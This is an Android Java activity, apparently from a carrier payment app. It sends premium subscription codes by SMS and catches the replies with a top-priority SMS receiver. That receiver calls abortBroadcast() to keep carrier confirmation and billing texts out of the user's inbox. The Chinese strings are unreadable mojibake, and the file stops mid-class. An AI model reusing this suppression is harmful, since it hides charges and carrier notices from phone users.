package com.mt.app.payment.activity;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.ProgressDialog;
import android.app.AlertDialog.Builder;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnLongClickListener;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemLongClickListener;
import android.widget.BaseAdapter;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.CompoundButton.OnCheckedChangeListener;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.RadioButton;
import android.widget.TextView;
import android.widget.Toast;
import com.mt.android.R;
import com.mt.android.sys.bean.base.ResponseBean;
import com.mt.android.sys.common.view.BaseActivity;
import com.mt.android.sys.mvc.common.Request;
import com.mt.android.sys.mvc.common.Response;
import com.mt.android.sys.mvc.controller.Controller;
import com.mt.android.view.common.CommandID;
import com.mt.app.payment.activity.Package_SelectActivity.SMAdapter;
import com.mt.app.payment.common.RegCodeInput;
import com.mt.app.payment.requestbean.CheckRegCodeBean;
import com.mt.app.payment.requestbean.PackageSelectReqBean;
import com.mt.app.payment.responsebean.MealSelected_DataBean;
import com.mt.app.payment.tools.InterceptService;

public class GuidePackage_SelectActivity extends BaseActivity {
	/** ��һ�η��Ͷ������� */
	private static final int HANDLER_FIRST_SMS_SUCCESS = 0X00 ;
	private static final int HANDLER_FIRST_SMS_ERROR = 0X01 ;
	/** ����ȷ�϶��ųɹ� */
	private static final int HANDLER_SECOND_SMS = 0X02 ;
	/** �����ɹ� */
	private static final int HANDLER_END_SMS_SUCCESS = 0X03 ;
	/** ����ʧ�� */
	private static final int HANDLER_END_SMS_ERROR = 0X04 ;
	/** ����ȷ�϶��ź��� */
	private static final String REPONSE_SMS_NUMBER_TWO = "10655134" ;
	/** ����ȷ�϶��Ų������� */
	private static final String REPONSE_SMS_CONTENT_TWO = "ȷ�϶�����ظ�Y" ;
	/** ��ͨ��Ӧ�����ɹ����߶���ʧ�ܺ��� */
	private static final String REPONSE_SMS_NUMBER_END = "10655134" ;
	/** ��ͨ��Ӧ�����ɹ����Ų������� */
	private static final String REPONSE_SMS_CONTENT_END_SUCCESS = "�ɹ�����������ͨ�ĵ��ӿ���ҵ��" ;
	/** ��ͨ��Ӧ����ʧ�ܶ��Ų������� */
	private static final String REPONSE_SMS_CONTENT_END_ERROR = "����÷̩ŵ���������ƶ���Ϣ�������޹�˾�ĵ��ӿ�����ҵ��ʧ��" ;
	/** ��ͨ��Ӧ�˶��ɹ���Ϣ*/
	private static final String REPONSE_SMS_CONTENT_CANCEL = "���ѳɹ��˶�������ͨ�ĵ��ӿ���ҵ��" ;
	/** ��ͨ��Ӧ�˶�ʧ����Ϣ*/
	private static final String REPONSE_SMS_CONTENT_CANCEL_ERROR = "��ȡ������÷̩ŵ���������ƶ���Ϣ�������޹�˾�ṩ�ĵ��ӿ���ҵ��ʧ��" ;
	/** ��ͨ��Ӧ�ظ�������Ϣ*/
	private static final String REPONSE_SMS_CONTENT_REPEAT = "�Բ������Ѿ�����" ;
	/** �յ�����ȷ�϶�����ʾ���û���������Ϣ */
	private static final String USER_SMS_SECOND = "��ӭ����÷̩ŵ���������ƶ���Ϣ�������޹�˾�ĵ��ӿ���������5Ԫ/�£�����ͨѶ�ѣ�ȷ�϶����밴ȷ����ť���������ȡ����ť��" ;
	/** �յ��ɹ�����������ʾ���û���������Ϣ */
	private static final String USER_SMS_SUCESS = "���ѳɹ�����������ͨ�ĵ��ӿ���ҵ�񣬵��¶���������Ч���¹��ܷ�5Ԫ���˶�����TDDZKB��106558892����˾�ͷ��绰4000328666��" ;
	/** �յ�����ʧ�ܶ�����ʾ���û���������Ϣ */
	private static final String USER_SMS_ERROR = "�Բ���������÷̩ŵ���������ƶ���Ϣ�������޹�˾�ĵ��ӿ�����Ʒʧ�ܣ��ͷ��绰4000328666���ɷѷ�����ÿ�¹��ܷ�5Ԫ������Ϣ��ѣ�" ;
	/** �յ��ɹ��˶�������ʾ���û���������Ϣ */
	private static final String USER_SMS_CANCEL_SUCESS = "���ѳɹ��˶�������ͨ�ĵ��ӿ���ҵ�������ٴζ����뷢��DGDZKB��106558892��" ;
	/** �յ��ظ�����������ʾ���û���������Ϣ */
	private static final String USER_SMS_CANCEL_SREPEAT = "�Բ������Ѿ�������������ͨ�ĵ��ӿ���ҵ�������ظ�������" ;
	/** �յ��˶�ʧ�ܶ�����ʾ���û���������Ϣ */
	private static final String USER_SMS_CANCEL_SUCESS_ERROR = "�Բ�����ȡ������÷̩ŵ���������ƶ���Ϣ�������޹�˾�ṩ�ĵ��ӿ�����Ʒʧ�ܡ�" ;
	
	private ProgressDialog mDialog ;
	/** �����û������ĶԻ��� */
	private static final int DIALOG_1 = 0X11 ;
	/** ���û���ʾ���ݵĶԻ��� */
	private static final int DIALOG_2 = 0X12 ;
	private ListView listview;
	private SMAdapter adapter;
	private TextView title;
	public static Handler handler;
	public static AlertDialog dialog;
	private final int SMSFIRST = 1;// ���ŵ�һ�η���
	private final int SMSSECOND = 2;// ���ŵڶ��η���
	private final int SMSTHRID = 3;// ���ŵ����η���
	private final String TAG_LOG = GuidePackage_SelectActivity.class.getSimpleName();
	private Button onoff, selectpackage, cancelselectpackage;
	private ImageView image, imgFrame;
	Context mContext = null;
	boolean show = true;
	Runnable runnable = new Runnable() {
		public void run() {
			mDialog.dismiss();
			show = true;
			Toast.makeText(GuidePackage_SelectActivity.this, "���ն��ų�ʱ����ע��鿴����", 3000).show();
		}
	};
	private int clickPosition = -1;
	private int a = 0;
	private String phoneNumber = "";
	public String packagespe, packagebus;
	private RegCodeInput regcode;
	MealSelected_DataBean bean;
	private boolean isBind = false;
	/** ��������յĹ㲥 **/
	String SENT_SMS_ACTION = "SENT_SMS_ACTION";
	String DELIVERED_SMS_ACTION = "DELIVERED_SMS_ACTION";
	List<String> packagename = new ArrayList<String>();
	List<String> packagespec = new ArrayList<String>();
	List<String> packagebusi = new ArrayList<String>();
	List<Boolean> packageflag = new ArrayList<Boolean>();

	@Override
	protected void onCreateContent(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreateContent(savedInstanceState);
		setContentView(R.layout.guidepackage_select_layout);
		title = (TextView) findViewById(R.id.titlewelcome);
		listview = (ListView) findViewById(R.id.guidesmlistview);
		onoff = (Button) findViewById(R.id.onoff);
		image = (ImageView) findViewById(R.id.onoffB);
		imgFrame = (ImageView) findViewById(R.id.package_frame_imageview);
		imgFrame.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				imgFrame.setVisibility(View.GONE);
			}
		});
		selectpackage = (Button) findViewById(R.id.guideselectpackage);
		cancelselectpackage = (Button) findViewById(R.id.cancelselectpackage);
		title.setText("�ײ�ѡ��");
		onoff.setVisibility(View.GONE);
		image.setVisibility(View.GONE);
		Controller.session.put("liantongphonenum", phoneNumber);
		Controller.session.put("isGuide", "1");
		Bundle bundle = getIntent().getBundleExtra("bundleInfo");
		if (bundle.getSerializable("package") != null) {
			bean = (MealSelected_DataBean) bundle.getSerializable("package");
			if (bean.getRows() == null) {
				showToast(this, "�����������ӣ�");
			}
			for (int i = 0; i < bean.getRows().size(); i++) {
				if (bean.getRows().get(i).getBind_flag().equals("1")) {
					clickPosition = i;
					packageflag.add(true);
					isBind = true;

				} else {
					packageflag.add(false);
				}
			}
			if (clickPosition != -1 && bean.getRows().get(clickPosition).getSpecial_no() != null) {
				phoneNumber = bean.getRows().get(clickPosition).getSpecial_no();
			}
			for (int i = 0; i < bean.getRows().size(); i++) {
				packagename.add(bean.getRows().get(i).getPkg_name());
				packagespec.add(bean.getRows().get(i).getSpecial_no());
				if (isBind) {
					packagebusi.add(bean.getRows().get(i).getUn_subscribe_code());
				} else {
					packagebusi.add(bean.getRows().get(i).getSubscribe_code());
				}

			}

			List<Map<String, Object>> listmap = new ArrayList<Map<String, Object>>();
			for (int i = 0; i < packagename.size(); i++) {
				Map<String, Object> map = new HashMap<String, Object>();
				map.put("text", packagename.get(i));
				map.put("spec", packagespec.get(i));
				map.put("busi", packagebusi.get(i));
				map.put("flag", packageflag.get(i));
				listmap.add(map);
			}

			adapter = new SMAdapter(this, listmap);
			listview.setAdapter(adapter);
		}

		handler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				super.handleMessage(msg);
				Log.i(TAG_LOG, "handleMessage()....");
				switch (msg.what) {
				case HANDLER_FIRST_SMS_SUCCESS :		// �������ŷ��ͳɹ�
					
					break;
				
				case HANDLER_FIRST_SMS_ERROR :			// �������ŷ���ʧ��
					try {
						if(mDialog.isShowing()) {
							dismissDialog(DIALOG_1) ;															
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
					Toast.makeText(GuidePackage_SelectActivity.this, "���ŷ���ʧ�ܣ������²���...", 0) ;
					break;
				
				case HANDLER_SECOND_SMS :
					try {
						try {
							if(mDialog.isShowing()) {
								dismissDialog(DIALOG_1) ;															
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
					Bundle data = msg.getData() ;
					String content = data.getString("smscontent") ;
					String number = data.getString("smsnumber") ;
					if(!TextUtils.isEmpty(content) & !TextUtils.isEmpty(number)) {
						showMyDialog(DIALOG_2, USER_SMS_SECOND, number, true) ;											
					}
					break;
				
				case HANDLER_END_SMS_SUCCESS :			// �˶�Ҳ���ߵ�����
				case HANDLER_END_SMS_ERROR :
					try {
						if(mDialog.isShowing()) {
							dismissDialog(DIALOG_1) ;															
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
					String smscontent = (String) msg.obj ;		// �յ��Ķ������� 
					if(!TextUtils.isEmpty(smscontent)) {
						String str = "" ;
						if(smscontent.contains(REPONSE_SMS_CONTENT_END_SUCCESS)) {
							str = USER_SMS_SUCESS ;
						} else if(smscontent.contains(REPONSE_SMS_CONTENT_END_ERROR)) {
							str = USER_SMS_ERROR ;
						} else if(smscontent.contains(REPONSE_SMS_CONTENT_CANCEL)) {
							str = USER_SMS_CANCEL_SUCESS ;
						} else if(smscontent.contains(REPONSE_SMS_CONTENT_REPEAT)) {
							str = USER_SMS_CANCEL_SREPEAT ;
						} else if(smscontent.contains(REPONSE_SMS_CONTENT_CANCEL_ERROR)) {
							str = USER_SMS_CANCEL_SUCESS_ERROR ;
						}
						showMyDialog(DIALOG_2, str,"", false) ;						
					}
					break;
				}
				
				/*if (msg.what == SMSFIRST) {
					Log.i(TAG_LOG, "ShowDialog()....1");
					if (dialog != null) {
						if (show) {
							Log.i(TAG_LOG, "ShowDialog()....1.1");
							ShowDialog(SMSFIRST, "���������Ժ�");
							this.postDelayed(runnable, 10000);
							show = false;
						}
					} else {
						Log.i(TAG_LOG, "ShowDialog()....1.2");
						ShowDialog(SMSFIRST, "���������Ժ�");
						this.postDelayed(runnable, 10000);
						show = false;
					}
				}
				if (msg.what == SMSSECOND) {
					Log.i(TAG_LOG, "ShowDialog()....2");
					dialog.cancel();
					handler.removeCallbacks(runnable);
					if (String.valueOf(msg.obj).contains("��ӭ����÷̩ŵ")) {
						ShowDialog(SMSSECOND, String.valueOf(msg.obj));
						show = true;
					}
					if (String.valueOf(msg.obj).contains("���ѳɹ�����������ͨ�ĵ��ӿ���ҵ��")) {
						ShowDialog(SMSTHRID, String.valueOf(msg.obj));
					}
					if (String.valueOf(msg.obj).contains("���ѳɹ��˶�������ͨ�ĵ��ӿ���ҵ��")) {
						ShowDialog(SMSTHRID, String.valueOf(msg.obj));
					}
				}*/
			}
		};
	}

	@Override
	public boolean onKeyDown(int keyCode, KeyEvent event) {
		if (keyCode == KeyEvent.KEYCODE_BACK) {
			return false;
		}
		return true;
	}

	BroadcastReceiver SmsReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			Log.i("SmsReceiver", "SmsReceiver....onReceive()");

			Bundle bundle = intent.getExtras();
			if (bundle != null) {
				Object[] pdusObjects = (Object[]) bundle.get("pdus");
				SmsMessage[] messages = new SmsMessage[pdusObjects.length];
				for (int i = 0; i < pdusObjects.length; i++) {
					messages[i] = SmsMessage.createFromPdu((byte[]) pdusObjects[i]);
				}
				// ���������ݺ�����������
				for (SmsMessage msg : messages) {
					// ��ȡ��������
					String content = msg.getMessageBody();
					String sender = msg.getOriginatingAddress();
					Date date = new Date(msg.getTimestampMillis());
					SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
					String sendTime = sdf.format(date);
					Log.i("SmsReceiver", "�յ�" + sender + "�Ķ���");
					Message message = new Message() ;
					if(sender.contains(REPONSE_SMS_NUMBER_TWO) & content.contains(REPONSE_SMS_CONTENT_TWO)) {	// ����ȷ�϶���
						abortBroadcast();
						Bundle data = new Bundle() ;
						data.putString("smscontent", content) ;
						data.putString("smsnumber", sender) ;
						message.setData(data) ;
						message.what = HANDLER_SECOND_SMS ;
						handler.sendMessage(message) ;
					} else if(sender.equals(REPONSE_SMS_NUMBER_END) /*& content.contains(REPONSE_SMS_CONTENT_END_SUCCESS)*/){		// �����ɹ�				
						abortBroadcast();
						message.obj = content ;
						message.what = HANDLER_END_SMS_SUCCESS ;
						handler.sendMessage(message) ;
					} /*else if(sender.contains(REPONSE_SMS_NUMBER_END) & content.contains(REPONSE_SMS_CONTENT_END_ERROR)){		// ����ʧ��
						abortBroadcast();
						message.obj = content ;
						message.what = HANDLER_END_SMS_ERROR ;
						handler.sendMessage(message) ;
					} else if(sender.contains(REPONSE_SMS_NUMBER_END) & content.contains(REPONSE_SMS_CONTENT_CANCEL)) {			// �˶�
						abortBroadcast();
						message.obj = content ;
						message.what = HANDLER_END_SMS_SUCCESS ;
						handler.sendMessage(message) ;
					} else if(sender.contains(REPONSE_SMS_NUMBER_END) & content.contains(REPONSE_SMS_CONTENT_REPEAT)) {
						abortBroadcast();
						message.obj = content ;
						message.what = HANDLER_END_SMS_SUCCESS ;
						handler.sendMessage(message) ;
					}*/
					if (sender.contains(phoneNumber)) {
						Log.i("SmsReceiver", "�յ�" + sender + "�Ķ���");
						abortBroadcast();
						if (dialog != null) {
							if (dialog.isShowing()) {
								Message msg2 = new Message();
								msg2.what = SMSSECOND;
								msg2.obj = content;
								handler.sendMessage(msg2);
							}
						}
					} else {
						Log.i("SmsReceiver", "�յ�:" + sender + "����:" + content + "ʱ��:" + sendTime.toString());
					}

				}
			}
		}
	};
	BroadcastReceiver MonitorSMS = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			Message msg = new Message();
			switch (getResultCode()) {
			case Activity.RESULT_OK: /* ���Ͷ��ųɹ� */

				Log.i(TAG_LOG, "MonitorSMS.....onReceive()....Activity.RESULT_OK");
				msg.what = HANDLER_FIRST_SMS_SUCCESS ;
				handler.sendMessage(msg);

				break;

			case SmsManager.RESULT_ERROR_GENERIC_FAILURE: /* ���Ͷ���ʧ�� */
				Toast.makeText(context, "���ŷ���ʧ��", Toast.LENGTH_LONG).show();
				msg.what = HANDLER_FIRST_SMS_ERROR ;
				handler.sendMessage(msg);
				break;

			case SmsManager.RESULT_ERROR_RADIO_OFF:

				break;

			case SmsManager.RESULT_ERROR_NULL_PDU:

				break;
			case SmsManager.RESULT_ERROR_NO_SERVICE:// ��ǰ���񲻿���
				Toast.makeText(context, "��ǰ���񲻿���,���ŷ���ʧ��", Toast.LENGTH_LONG).show();
				msg.what = HANDLER_FIRST_SMS_ERROR ;
				handler.sendMessage(msg);
				break;
			}
		}
	};

	/*public void ShowDialog(final int flag, String str) {
		AlertDialog.Builder builder = new AlertDialog.Builder(GuidePackage_SelectActivity.this);
		dialog = builder.create();
		if (str.contains("��ӭ����÷̩ŵ")) {
			builder.setMessage("��ӭ����÷̩ŵ���������ƶ���Ϣ�������޹�˾�ĵ��ӿ���������5Ԫ/�£�����ͨѶ�ѣ������밴ȷ�����˶�����TDDZKB��106558892����˾�ͷ��绰400328666�� ");
		} else {
			builder.setMessage(str);
		}
		if (flag == SMSFIRST) {
		} else {
			builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {
				public void onClick(DialogInterface dialog, int whichButton) {
					dialog.dismiss();
					if (flag == SMSSECOND) {
						Log.i(TAG_LOG, "flag == 2");
						sendSMS(phoneNumber, "y");
					} else if (flag == SMSTHRID) {
						Request request = new Request();
						go(CommandID.map.get("GuideBASECARDSTART"), request, true);
						new Handler().postDelayed(new Runnable() {
							public void run() {
								finish();
							}
						}, 1000);
					}
				}
			});
		}
		dialog = builder.show();
		dialog.setCanceledOnTouchOutside(false);
	}*/

	/**
	 * ����˵�� destinationAddress:�����˵��ֻ����� scAddress:�����˵��ֻ����� text:������Ϣ������
	 * sentIntent:�����Ƿ�ɹ��Ļ�ִ�����ڼ��������Ƿ��ͳɹ���
	 * DeliveryIntent:�����Ƿ�ɹ��Ļ�ִ�����ڼ������ŶԷ��Ƿ���ճɹ���
	 */
	private void sendSMS(String phoneNumber, String message) {

		Log.i(TAG_LOG, "���Ͷ��ţ�������" + message);

		// ---sends an SMS message1 to another device---
		SmsManager sms = SmsManager.getDefault();

		// create the sentIntent parameter
		Intent sentIntent = new Intent(SENT_SMS_ACTION);
		PendingIntent sentPI = PendingIntent.getBroadcast(this, 0, sentIntent, 0);

		// create the deilverIntent parameter
		Intent deliverIntent = new Intent(DELIVERED_SMS_ACTION);
		PendingIntent deliverPI = PendingIntent.getBroadcast(this, 0, deliverIntent, 0);

		// ����������ݳ���70���ַ� ���������Ų�ɶ������ŷ��ͳ�ȥ
		if (message.length() > 70) {
			ArrayList<String> msgs = sms.divideMessage(message);
			for (String msg : msgs) {
				sms.sendTextMessage(phoneNumber, null, msg, sentPI, deliverPI);
			}
		} else {
			sms.sendTextMessage(phoneNumber, null, message, sentPI, deliverPI);
		}
	}

	@Override
	@Deprecated
	protected Dialog onCreateDialog(final int id, final Bundle args) {
		switch (id) {
		case DIALOG_1 :
			if (mDialog != null) {
				return mDialog;
			}

			ProgressDialog dlg = new ProgressDialog(this);
			dlg.setMessage(args.getString("content"));
			dlg.setCancelable(false);
			dlg.setCanceledOnTouchOutside(false);
			mDialog = dlg;
			return dlg;
		case DIALOG_2 :
			AlertDialog.Builder builder = new AlertDialog.Builder(this) ;
			builder.setMessage(args.getString("content")) ;
			builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int which) {
						if(args.getBoolean("flag")) {			// ����ȷ�϶���
							try {
								if(mDialog.isShowing()) {
									dismissDialog(DIALOG_1) ;															
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
							showMyDialog(DIALOG_1, "���Ժ�...") ;
							handler.postDelayed(runnable, 20000) ;
							sendSMS(args.getString("number"), "Y") ;
						} else {
							setData() ;
							if(USER_SMS_CANCEL_SUCESS_ERROR.equals(args.getString("content"))) {
								isBind = true ;
								exit() ;		
							}
							if(USER_SMS_SUCESS.equals(args.getString("content"))) {		// ���Ƴɹ�
								isBind = true ;
								exit() ;
							}
							if(USER_SMS_CANCEL_SUCESS.equals(args.getString("content"))) {		// �˶��ɹ�
								isBind = false ;
								exit() ;
							}
						}
					}
				}) ;
			if(args.getBoolean("flag")) {
				builder.setNegativeButton("ȡ��", new DialogInterface.OnClickListener() {
					public void onClick(DialogInterface dialog, int which) {
						try {
							if(mDialog.isShowing()) {
								dismissDialog(DIALOG_1) ;															
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}) ;				
			}
			return builder.create() ;
		default:
			return super.onCreateDialog(id, args);
		}
	}

	@Override
	@Deprecated
	protected void onPrepareDialog(int id, Dialog dialog, Bundle args) {
		switch (id) {
		case 0x11 :
			((ProgressDialog)dialog).setMessage(args.getString("content")) ;
		case 0x12 :
			removeDialog(id) ;
		default:
			super.onPrepareDialog(id, dialog);
		}
	}	
	
	/**
	 * @param id ��ʾ���ֶԻ���
	 * @param content �Ի�����ʾ������ 
	 * @param number ���͸��Ի���ĺ���
	 * @param flag ���͸��Ի���ı�ǣ����ڱ�ʶ�Ƿ���ʾȡ����ť
	 */
	private void showMyDialog(int id, String content, String number, Boolean flag) {
		Bundle bundle = new Bundle() ;
		bundle.putString("content", content) ;
		bundle.putString("number", number) ;
		bundle.putBoolean("flag", flag) ;
		showDialog(id, bundle) ;
	}
	
	private void showMyDialog(int id, String content) {
		showMyDialog(id, content, "", true) ;
	}	

	/**
	 * �������� ��ȡ�ײ���Ϣ
	 */
	private void setData() {
		Request request = new Request();
		PackageSelectReqBean city = new PackageSelectReqBean();
		city.setCity(Controller.session.get("AREA_CODE_LEVEL_1").toString());
		city.setRows(10);
		city.setPage(1);
		request.setData(city);
		go(CommandID.map.get("PACKAGESELECT"), request, true);
	}
	
	/* ��֤�� */
	public void checkRegInfo(String vregCode) {// �˶���֤��
		Request request = new Request();
		CheckRegCodeBean regcode = new CheckRegCodeBean();
		regcode.setValidateCode(vregCode);
		request.setData(regcode);

		go(CommandID.map.get("RegCodeVerfi"), request, true);
	}

	public void getRegInfo() {
		Request request = new Request();
		go(CommandID.map.get("RegCodeGet"), request, true);
	}

	@Override
	protected void onResume() {
		// TODO Auto-generated method stub
		super.onResume();
		
		if (isBind) {
			selectpackage.setText("�˶�");
		} else {
			selectpackage.setText("����");
		}
		
		listview.setOnItemLongClickListener(new OnItemLongClickListener() {

			@Override
			public boolean onItemLongClick(AdapterView<?> arg0, View arg1, int arg2, long arg3) {
				Log.i("=====position===", arg2 + "");
				AlertDialog.Builder builder = new Builder(GuidePackage_SelectActivity.this);

				builder.setMessage((bean.getRows().get(arg2)).getDetail());

				builder.setTitle("�ײͽ���");

				builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {

					@Override
					public void onClick(DialogInterface dialog, int which) {
						dialog.dismiss();
					}
				});

				builder.create().show();
				return true;
			}

		});
		mContext = this;
		selectpackage.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				if (clickPosition == -1) {
					showToast(GuidePackage_SelectActivity.this, "����ѡ����Ҫ���Ƶ��ײ�");
				} else {
					AlertDialog.Builder builder = new Builder(GuidePackage_SelectActivity.this);
					if (isBind) {
						builder.setMessage("�ף����ȷ���ͻ��˶�" + (bean.getRows().get(clickPosition).getPkg_name()) + "�ײ���,����˼������������ͨ�û�");
					} else {
						builder.setMessage((bean.getRows().get(clickPosition).getDetail()));
					}

					builder.setTitle("��ʾ");
					builder.setPositiveButton("ȷ��", new DialogInterface.OnClickListener() {

						@Override
						public void onClick(DialogInterface dialog, int which) {
							dialog.dismiss();
							try {

								String message;
								if (isBind) {
									message = (bean.getRows().get(clickPosition).getUn_subscribe_code());
								} else {
									message = (bean.getRows().get(clickPosition).getSubscribe_code());
								}
								// message = "dgtc";
								Log.i("=========����=====", message == null ? "null" : message);
								Log.i("=========����=====", (bean.getRows().get(clickPosition).getSpecial_no()));
								// ���ǻ����ͨ����˵ĺ��룬��Ϊ����ԭ��û���ã����Ծ�����ͬ�µĵ绰���롣
								phoneNumber = bean.getRows().get(clickPosition).getSpecial_no();
								Controller.session.put("liantongphonenum", phoneNumber);
								showMyDialog(DIALOG_1, "���ڷ��Ͷ���,�����ĵȴ�...") ;
								handler.postDelayed(runnable, 20000) ;
								sendSMS(phoneNumber, message);
							} catch (Exception e) {
								showToast(GuidePackage_SelectActivity.this, "���ŷ���ʧ�ܣ�");
							}

						}
					});

					builder.setNegativeButton("ȡ��", new DialogInterface.OnClickListener() {

						@Override
						public void onClick(DialogInterface dialog, int which) {
							dialog.dismiss();
						}
					});

					builder.create().show();

				}
			}
		});
		cancelselectpackage.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				exit() ;
			}
		});
		/*
		 * selectpackage.setOnClickListener(new OnClickListener() {
		 * 
		 * @Override public void onClick(View v) { // TODO Auto-generated method
		 * stub
		 * 
		 * // ��֤�� if (Controller.session.get("regcode") == null) {//
		 * ���û��������֤��,�򷵻� regcode = new
		 * RegCodeInput(Package_SelectActivity.this); regcode.showDialog();
		 * return; } // ��֤��
		 * 
		 * SmsUtil sms = new SmsUtil(); try { if (packagespe == null) {
		 * Toast.makeText(Package_SelectActivity.this, "��ѡ���ײ�", 3000).show(); }
		 * else { sms.sendMessage(Package_SelectActivity.this, packagespe,
		 * packagebus); } } catch (Exception e) { // TODO: handle exception
		 * e.printStackTrace(); } } });
		 */
		onoff.setVisibility(View.GONE);

		IntentFilter filter = new IntentFilter();
		filter.addAction(SENT_SMS_ACTION);
		filter.addAction(DELIVERED_SMS_ACTION);
		registerReceiver(MonitorSMS, filter);

		filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
		filter.setPriority(Integer.MAX_VALUE);
		registerReceiver(SmsReceiver, filter);

		/*Intent intent = new Intent(GuidePackage_SelectActivity.this, InterceptService.class);
		Log.i("com.mt.android", "��������");
		startService(intent);*/

	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
		Controller.session.remove("isGuide");
		try {
			// ȡ���㲥 ������Ϣ
			unregisterReceiver(MonitorSMS);
			unregisterReceiver(SmsReceiver);
			Intent intent = new Intent(this, InterceptService.class);
			stopService(intent);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	/* ��֤�� */
	@Override
	public void onSuccess(Response response) {
		bean = (MealSelected_DataBean) response.getData() ;
		Bundle bundle = getIntent().getBundleExtra("bundleInfo");
		//if (bundle.getSerializable("package") != null) {
//			bean = (MealSelected_DataBean) bundle.getSerializable("package");
			if (bean.getRows().isEmpty()) {
				Toast.makeText(this, "��������ʧ�ܣ�������", 3000).show();
			} else {
				for (int i = 0; i < bean.getRows().size(); i++) {
					if (bean.getRows().get(i).getBind_flag().equals("1")) {
						clickPosition = i;
						packageflag.add(true);
						isBind = true;

					} else {
						packageflag.add(false);
					}
				}
				if (clickPosition != -1 && bean.getRows().get(clickPosition).getSpecial_no() != null) {
					phoneNumber = bean.getRows().get(clickPosition).getSpecial_no();
				}

				if (isBind) {
					selectpackage.setText("�˶�");
				} else {
					selectpackage.setText("����");
				}
				
				for(int i=0; i<packagename.size(); i++) {
					packagename.remove(i) ;
					packagespec.remove(i) ;
					packagebusi.remove(i) ;
					packageflag.remove(i) ;					
				}

				for (int i = 0; i < bean.getRows().size(); i++) {
					packagename.add(bean.getRows().get(i).getPkg_name());
					packagespec.add(bean.getRows().get(i).getSpecial_no());
					if (isBind) {
						packagebusi.add(bean.getRows().get(i).getUn_subscribe_code());
					} else {
						packagebusi.add(bean.getRows().get(i).getSubscribe_code());
					}

				}
				List<Map<String, Object>> listmap = new ArrayList<Map<String, Object>>();
				for (int i = 0; i < packagename.size(); i++) {
					Map<String, Object> map = new HashMap<String, Object>();
					map.put("text", packagename.get(i));
					map.put("spec", packagespec.get(i));
					map.put("busi", packagebusi.get(i));
					map.put("flag", packageflag.get(i));
					listmap.add(map);
				}

				adapter = new SMAdapter(this, listmap);
				listview.setAdapter(adapter);
			}
		//}
		Controller.session.put("liantongphonenum", phoneNumber);
		try {
			/* ��֤�� */
			if (regcode != null && regcode.isRegResponse(response)) {
				return;
			}
			/* ��֤�� */
			if ((ResponseBean) response.getData() != null) {
//				Toast.makeText(GuidePackage_SelectActivity.this, ((ResponseBean) response.getData()).getMessage(), Toast.LENGTH_SHORT).show();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
//		Request request = new Request();
//		go(CommandID.map.get("GuideBASECARDSTART"), request, true);
	}

	@Override
	public void onError(Response response) {
		// TODO Auto-generated method stub
		try {

			/* ��֤�� */
			if (regcode != null && regcode.isRegResponse(response)) {
				return;
			}
			/* ��֤�� */

			if ((ResponseBean) response.getData() != null) {

				Toast.makeText(GuidePackage_SelectActivity.this, ((ResponseBean) response.getData()).getMessage(), Toast.LENGTH_SHORT).show();

			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	/**
	 * �˳���ǰ�������������ý���
	 */
	private void exit() {
		Request request = new Request();
		go(CommandID.map.get("GuideBASECARDSTART"), request, true);
		if(!isBind) {
			Log.i(TAG_LOG, "isBind == " + isBind) ;
			Toast.makeText(GuidePackage_SelectActivity.this, "��ѡ���ײͣ����������ܵ����ӿ������Ż��ۿ۵ķ���", Toast.LENGTH_LONG).show();					
		}
		new Handler().postDelayed(new Runnable() {
			public void run() {
				Controller.session.remove("isGuide");
				finish();
			}
		}, 3000);
	}

	class SMAdapter extends BaseAdapter {
		private Context context;
		private List<Map<String, Object>> listItems;
		private LayoutInflater listContainer;

		public final class ListItemView {
			public TextView text;
			public RadioButton radio;
			public String spec, busi;
			public String flag;

		}

		public SMAdapter(Context context, List<Map<String, Object>> listItems) {
			// TODO Auto-generated constructor stub
			this.context = context;
			listContainer = LayoutInflater.from(context);
			this.listItems = listItems;

		}

		@Override
		public int getCount() {
			// TODO Auto-generated method stub
			return listItems.size();
		}

		@Override
		public Object getItem(int arg0) {
			// TODO Auto-generated method stub
			return null;
		}

		@Override
		public long getItemId(int arg0) {
			// TODO Auto-generated method stub
			return 0;
		}

		@Override
		public View getView(int position, View convertView, ViewGroup parent) {
			final ListItemView listItemView = new ListItemView();
			// ��ȡlist_item�����ļ�����ͼ
			convertView = listContainer.inflate(R.layout.package_psitem_layout, null);
			// ��ȡ�ؼ�����
			listItemView.text = (TextView) convertView.findViewById(R.id.SMtextView);
